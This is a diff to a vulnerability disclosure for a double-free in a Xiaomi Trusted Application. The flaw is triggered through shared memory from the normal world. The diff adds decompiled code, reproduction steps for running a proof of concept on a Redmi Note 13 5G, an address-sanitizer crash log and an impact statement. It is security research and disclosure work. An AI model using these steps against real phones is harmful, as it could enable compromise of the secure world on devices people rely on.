@@ -1,5 +1,7 @@
 
 We identify a double-free vulnerability in a Trusted Application (TA) (UUID: `3d08821c-33a6-11e6-a1fa089e01c83aa2`), which can be triggered by exploiting a double-fetch condition on memory shared between the normal world and the secure world.
+An attacker can easily manipulate this shared memory from normal world to influence the behavior of the TA in secure world.
+
 
 ## Device Information
 
@@ -18,7 +20,6 @@ As shown below, an attacker can supply two shared memory regions, `mem_area1` an
 
 ```C
 uint TA_InvokeCommandEntryPoint(undefined8 param_1,uint comm_id,uint param_3,undefined8 *params)
-
 {
   uint uVar1;
   uint *mem_area1;
@@ -81,7 +82,7 @@ This is the overall call chain of the vulnerability's POC.
 19	     if (__ptr_00 == (void *)0x0) { /* failed */
 20	       printf("[%s:%s][%s:%d]get sim file path error\n","VSIMApp","ERROR","sim_del",0x57);
 21	       free(__ptr);        /* free again */
-22	       return 0xfffe0001;
+22	       return 0xfffe0001;  // return 0xfffe0001
 23	     }
 24	   //...
 ```
@@ -183,7 +184,7 @@ Later, `del_imsi_index` in `FUN_comm_0x1001` is invoked with the buffer `__ptr` 
 
 Furthermore, even when the file exists, it is still possible to modify `mem_area1`, which in turn affects the output of `unhexlify`. As a result, the `consttime_memcmp` check inside `del_imsi_index` fails, leading the function to return **0** as well.
 
-At this point, the control flow enters the `if` branch starting at line 18 of `FUN_comm_0x1001` and calls `(void *)_get_path_from_imsi(mem_area1 + 8, 1)`. If this function returns **0**, the check at line 19 succeeds, which can then trigger a double-free vulnerability at line 21 in `FUN_comm_0x1001`, where `free(__ptr)` is called.
+At this point, the control flow enters the `if` branch starting at line 18 of `FUN_comm_0x1001` and calls `(void *)_get_path_from_imsi(mem_area1 + 8, 1)`. If this function returns **0**, the check at line 19 succeeds and then triggers a double-free vulnerability at line 21 in `FUN_comm_0x1001`, where `free(__ptr)` is called and returns `0xfffe0001` as an error code.
 
 Okay, the final objective is to make `_get_path_from_imsi(mem_area1 + 8, 1)` return **0**.
 
@@ -232,143 +233,7 @@ Until now, everything is quite clear: by manipulating the shared memory between 
 
 
 
-## Screenshots for Validity
-
-
-```C
-[+]     [%s:%s][%s:%d]==func: 0
-[+]     enter==: 0
-[+]     VSIMApp: 0
-[+]     INFO: 0
-[+]     TA_CreateEntryPoint: 0
-[+]     exit==: 0
-[=]     [TA_OpenSessionEntryPoint] start @0x55555557a0a8
-[=]     printf: [VSIMApp:INFO][TA_OpenSessionEntryPoint:34]==func enter==
-
-[=]     printf: [VSIMApp:INFO][TA_OpenSessionEntryPoint:36]==func exit==
-
-[=]     [TA_OpenSessionEntryPoint] reach end @0x55555557a118
-[+]
-[+]     syscalls called
-[+]     ------------------------
-[+]
-[+]     strings ocurrences
-[+]     ------------------------
-[+]     [%s:%s][%s:%d]==func: 0
-[+]     enter==
-: 0
-[+]     VSIMApp: 0
-[+]     INFO: 0
-[+]     TA_CreateEntryPoint: 0
-[+]     exit==
-: 0
-[+]     TA_OpenSessionEntryPoint: 0
-[+]     TEEC_InvokeCommand 0 0 0x0
-3d08 custom harness!!!! Placing input: b'd\x01\x00\x00\x00\x00\x00\x00'
-[+]     mem p 0x608
-[+]     mem p 0x608
-[=]     printf: [VSIMApp:INFO][TA_InvokeCommandEntryPoint:53]==func enter==
-[=]     printf: [VSIMApp:INFO][TA_InvokeCommandEntryPoint:54]cmd 00001001
-[=]     TEE_Malloc: allocated 0x104 at 0xaaaab020
-[=]     redzone hook 0xaaaab000
-[+]     ASAN: hook rw for redzone [0xaaaab000:0xaaaab020]
-[=]     redzone hook 0xaaaab124
-[+]     ASAN: hook rw for redzone [0xaaaab124:0xaaaac000]
-[=]     strlen 0x555555558c4c: 15
-[=]     TEE_OpenPersistentObject:
-[=]             objectID b'/sim/imsi.index'
-[=]             file name: ./emulate/files/2147483648/-sim-imsi.index
-[=]             ret 0xffff0008
-[=]     printf: [VSIMApp:ERROR][read_data:118]Open file /sim/imsi.index fail, err: ffff0008
-
-[=]     printf: [VSIMApp:ERROR][del_imsi_index:221]read imsi table fail, err: ffff0008
-
-[=]     free: freeing memory at 0xaaaab020
-[+]     ASAN: unhook rw for redzone [0xaaaab000:0xaaaab020]
-[+]     ASAN: unhook rw for redzone [0xaaaab124:0xaaaac000]
-[=]     free: freeing memory at 0xaaaaa020
-[+]     ASAN: unhook rw for redzone [0xaaaaa000:0xaaaaa020]
-[+]     ASAN: unhook rw for redzone [0xaaaaa020:0xaaaab000]
-[=]     TEE_Malloc: allocated 0x18 at 0xaaaaa020
-[=]     redzone hook 0xaaaaa000
-[+]     ASAN: hook rw for redzone [0xaaaaa000:0xaaaaa020]
-[=]     redzone hook 0xaaaaa038
-[+]     ASAN: hook rw for redzone [0xaaaaa038:0xaaaab000]
-[=]     snprintf: len: 0x18 "b'/sim/\x00'" written to 0xaaaaa020, lr: 0x55555557902c
-[=]     strlen 0xaaaaa020: 5
-[=]     printf: [VSIMApp:ERROR][_get_path_from_imsi:101]path size /sim/ (5/23) is not expected
-
-[=]     free: freeing memory at 0xaaaaa020
-[+]     ASAN: unhook rw for redzone [0xaaaaa000:0xaaaaa020]
-[+]     ASAN: unhook rw for redzone [0xaaaaa038:0xaaaab000]
-[=]     printf: [VSIMApp:ERROR][sim_del:87]get sim file path error
-
-[x]     corrupted free at: 0xaaaaa020, {'allocated': {}, 'freed': {2863312928: 260, 2863308832: 24}, 'redzones': {}}
-[x]     =================[lr: 0x555555576a0c] [free] memory corruption detected!!
-[x]     CPU Context:
-[x]     x0      : 0xaaaaa020
-[x]     x1      : 0x55555555a99a
-[x]     x2      : 0x555555558f51
-[x]     x3      : 0x55555555595e
-[x]     x4      : 0x57
-[x]     x5      : 0xaaaaa020
-[x]     x6      : 0x5
-[x]     x7      : 0x17
-[x]     x8      : 0xcacacacacacacaca
-[x]     x9      : 0x55555555c9b8
-[x]     x10     : 0x55555557a374
-[x]     x11     : 0x3c
-[x]     x12     : 0x0
-[x]     x13     : 0x0
-[x]     x14     : 0x0
-[x]     x15     : 0x0
-[x]     x16     : 0x5555555b24d8
-[x]     x17     : 0x99999098
-[x]     x18     : 0x0
-[x]     x19     : 0xaaaaa020
-[x]     x20     : 0x0
-[x]     x21     : 0xbbbbe008
-[x]     x22     : 0x55555555a99a
-[x]     x23     : 0x555555556d0c
-[x]     x24     : 0x55555555a3e8
-[x]     x25     : 0x0
-[x]     x26     : 0x0
-[x]     x27     : 0x0
-[x]     x28     : 0x0
-[x]     x29     : 0x8000002dddc0
-[x]     x30     : 0x555555576a0c
-[x]     sp      : 0x8000002ddda0
-[x]     pc      : 0xdeadbeef
-[x]     lr      : 0x555555576a0c
-[x]     cpacr_el1       : 0x300000
-[x]     pstate  : 0x800003c5
-[x]     PC = 0x00000000deadbeef (unreachable)
-
-[x]     Memory map:
-[x]     Start            End              Perm    Label                                    Image
-[x]     00000000eee000 - 00000000eef000   rw-     [fuchsia] tls
-[x]     00000000f00000 - 00000000f10000   rw-     [fuchsia] thread-stack
-[x]     00000099999000 - 0000009999a000   rwx     dl_resolve
-[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id
-[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context
-[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params
-[x]     000000bbbbe000 - 000000bbbbf000   rw-     shared_memory_0
-[x]     000000bbbbf000 - 000000bbbc0000   rw-     shared_memory_1
-[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]
-[x]     00555555554000 - 00555555573000   r--     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
-[x]     00555555573000 - 005555555af000   r-x     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
-[x]     005555555af000 - 005555555be000   rw-     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
-[x]     007ffff7dd5000 - 007ffff7e28000   r--     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
-[x]     007ffff7e28000 - 007ffff7e99000   r-x     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
-[x]     007ffff7e99000 - 007ffff7ea0000   rw-     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
-[x]     007ffffffde000 - 008000002de000   rwx     [stack]
-Traceback (most recent call last):
-```
-
-
-
-
-### Source code of the POC
+## Source code of the POC
 
 As you can see from the POC, it is unnecessary to modify the contents of `mem_area1` or race against the checks with an additional thread, because the absence of the `/sim/imsi.index` file makes it easier for `del_imsi_index` to return zero in our device (`Redmi Note 13 5G`).
 
@@ -497,11 +362,151 @@ $x4      : 0x00000000bbbbe008  ->  0x0000000000003600
 [*Thread Id:1, tid:6550] Name: "3d08821c-33a6-11e6-a1fa089e01c83aa2.ta", stopped at 0x555555579040 <NO_SYMBOL>, reason: BREAKPOINT
 ```
 
+For reference, the dependent files for the PoC are attached here.
+- `tee_client_api.h`: Open-sourced in the OPTEE repo
+- `tee.h`: Open-sourced in the OPTEE repo
+- `repro.h`: Contains basic utilities specific to this PoC, primarily handling parameter initialization, TEE Client API invocation, and character-related operations.
+- `libteecli.so`: Can be found at the device path ./vendor/lib64/libteecli.so.
+- `Makefile`: Helps to generate and push specific poc binary to the phone
 
-### Vulnerability Reproduction
 
 
-1. preacquisition
-2. interaction
+## Vulnerability Reproduction
 
-#TODO
+
+We reproduced the poc on the Redmi Note 13 5G (OS Version: 1.0.18.0.UNQEUXM)
+
+
+1. Compile the poc:
+
+```bash
+ANDROID_NDK=$(path to android ndk) make phone
+```
+
+Upload the generate `./poc` executable to `/vendor/bin`. (On the phone we used a magisk plugin for this, but on a developer phone it should be possible to make `/vendor` writable)
+
+2. Then run the poc: 
+   
+```
+/vendor/bin/poc
+```
+
+The poc triggers the double free of TA. The poc prints the return code and error origin which will be, indicating the vulnerability.
+
+```bash
+TEEC_Result: fffe0001 origin: err_origin: 4
+# the return code 'fffe0001' presents the double free.
+```
+
+### Screenshots for Validity
+
+![screenshots](pics/image.png)
+
+
+More detailed can be seen in our customized emulation mode with address sanitizer.
+
+```C
+[+]     [%s:%s][%s:%d]==func: 0
+[+]     enter==: 0
+[+]     VSIMApp: 0
+[+]     INFO: 0
+[+]     TA_CreateEntryPoint: 0
+[+]     exit==: 0
+[=]     [TA_OpenSessionEntryPoint] start @0x55555557a0a8
+[=]     printf: [VSIMApp:INFO][TA_OpenSessionEntryPoint:34]==func enter==
+[=]     printf: [VSIMApp:INFO][TA_OpenSessionEntryPoint:36]==func exit==
+[=]     [TA_OpenSessionEntryPoint] reach end @0x55555557a118
+[+]     [%s:%s][%s:%d]==func: 0
+[+]     enter==
+: 0
+[+]     VSIMApp: 0
+[+]     INFO: 0
+[+]     TA_CreateEntryPoint: 0
+[+]     exit==
+: 0
+[+]     TA_OpenSessionEntryPoint: 0
+[+]     TEEC_InvokeCommand 0 0 0x0
+3d08 custom harness!!!! Placing input: b'd\x01\x00\x00\x00\x00\x00\x00'
+[+]     mem p 0x608
+[+]     mem p 0x608
+[=]     printf: [VSIMApp:INFO][TA_InvokeCommandEntryPoint:53]==func enter==
+[=]     printf: [VSIMApp:INFO][TA_InvokeCommandEntryPoint:54]cmd 00001001
+[=]     TEE_Malloc: allocated 0x104 at 0xaaaab020
+[=]     redzone hook 0xaaaab000
+[+]     ASAN: hook rw for redzone [0xaaaab000:0xaaaab020]
+[=]     redzone hook 0xaaaab124
+[+]     ASAN: hook rw for redzone [0xaaaab124:0xaaaac000]
+[=]     strlen 0x555555558c4c: 15
+[=]     TEE_OpenPersistentObject:
+[=]             objectID b'/sim/imsi.index'
+[=]             file name: ./emulate/files/2147483648/-sim-imsi.index
+[=]             ret 0xffff0008
+[=]     printf: [VSIMApp:ERROR][read_data:118]Open file /sim/imsi.index fail, err: ffff0008
+
+[=]     printf: [VSIMApp:ERROR][del_imsi_index:221]read imsi table fail, err: ffff0008
+
+[=]     free: freeing memory at 0xaaaab020
+[+]     ASAN: unhook rw for redzone [0xaaaab000:0xaaaab020]
+[+]     ASAN: unhook rw for redzone [0xaaaab124:0xaaaac000]
+[=]     free: freeing memory at 0xaaaaa020
+[+]     ASAN: unhook rw for redzone [0xaaaaa000:0xaaaaa020]
+[+]     ASAN: unhook rw for redzone [0xaaaaa020:0xaaaab000]
+[=]     TEE_Malloc: allocated 0x18 at 0xaaaaa020
+[=]     redzone hook 0xaaaaa000
+[+]     ASAN: hook rw for redzone [0xaaaaa000:0xaaaaa020]
+[=]     redzone hook 0xaaaaa038
+[+]     ASAN: hook rw for redzone [0xaaaaa038:0xaaaab000]
+[=]     snprintf: len: 0x18 "b'/sim/\x00'" written to 0xaaaaa020, lr: 0x55555557902c
+[=]     strlen 0xaaaaa020: 5
+[=]     printf: [VSIMApp:ERROR][_get_path_from_imsi:101]path size /sim/ (5/23) is not expected
+
+[=]     free: freeing memory at 0xaaaaa020
+[+]     ASAN: unhook rw for redzone [0xaaaaa000:0xaaaaa020]
+[+]     ASAN: unhook rw for redzone [0xaaaaa038:0xaaaab000]
+[=]     printf: [VSIMApp:ERROR][sim_del:87]get sim file path error
+
+[x]     corrupted free at: 0xaaaaa020, {'allocated': {}, 'freed': {2863312928: 260, 2863308832: 24}, 'redzones': {}}
+[x]     =================[lr: 0x555555576a0c] [free] memory corruption detected!!
+[x]     CPU Context:
+[x]     x0      : 0xaaaaa020
+[x]     x1      : 0x55555555a99a
+[x]     x2      : 0x555555558f51
+[x]     x3      : 0x55555555595e
+[x]     x4      : 0x57
+[x]     x5      : 0xaaaaa020
+[x]     x6      : 0x5
+[x]     x7      : 0x17
+[x]     x8      : 0xcacacacacacacaca
+[x]     x9      : 0x55555555c9b8
+[x]     x10     : 0x55555557a374
+[x]     sp      : 0x8000002ddda0
+[x]     pc      : 0xdeadbeef
+[x]     lr      : 0x555555576a0c
+[x]     cpacr_el1       : 0x300000
+[x]     pstate  : 0x800003c5
+[x]     PC = 0x00000000deadbeef (unreachable)
+[x]     Memory map:
+[x]     Start            End              Perm    Label                                    Image
+[x]     00000000eee000 - 00000000eef000   rw-     [fuchsia] tls
+[x]     00000000f00000 - 00000000f10000   rw-     [fuchsia] thread-stack
+[x]     00000099999000 - 0000009999a000   rwx     dl_resolve
+[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id
+[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context
+[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params
+[x]     000000bbbbe000 - 000000bbbbf000   rw-     shared_memory_0
+[x]     000000bbbbf000 - 000000bbbc0000   rw-     shared_memory_1
+[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]
+[x]     00555555554000 - 00555555573000   r--     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
+[x]     00555555573000 - 005555555af000   r-x     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
+[x]     005555555af000 - 005555555be000   rw-     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
+[x]     007ffff7dd5000 - 007ffff7e28000   r--     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
+[x]     007ffff7e28000 - 007ffff7e99000   r-x     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
+[x]     007ffff7e99000 - 007ffff7ea0000   rw-     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
+[x]     007ffffffde000 - 008000002de000   rwx     [stack]
+```
+
+## Impact
+
+This double free bug may be leveraged to corrupt heap memory and achieve code execution on the MiTEE or QSEE environment of Xiaomi devices.
+
+An attacker **running in the normal world** (either as root or in the context of a process able to communicate with the tee drivers like `/dev/tee0` or `/dev/teepriv0`) can trigger this bug. 
